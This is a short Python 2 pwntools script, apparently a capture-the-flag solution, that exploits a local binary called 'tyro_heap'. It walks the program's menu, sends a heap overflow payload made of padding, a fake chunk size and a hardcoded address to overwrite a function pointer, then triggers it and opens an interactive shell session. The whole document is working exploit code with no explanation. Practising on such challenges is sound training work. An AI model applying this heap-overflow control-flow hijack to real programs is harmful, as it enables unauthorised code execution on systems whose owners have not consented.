from pwn import *

p = process("./tyro_heap")
print p.recv()
p.sendline("c")
print p.recv()
p.sendline("c")
print p.recv()

p.sendline("b")
print p.recv()
p.sendline("0")
print p.recv()
payload =""
payload+="a"*0x20
payload+=p32(0x29)
payload+=p32(0x08048660)
p.sendline(payload)
print p.recv()
p.sendline("e")
print p.recv()
p.sendline("1")
p.interactive()
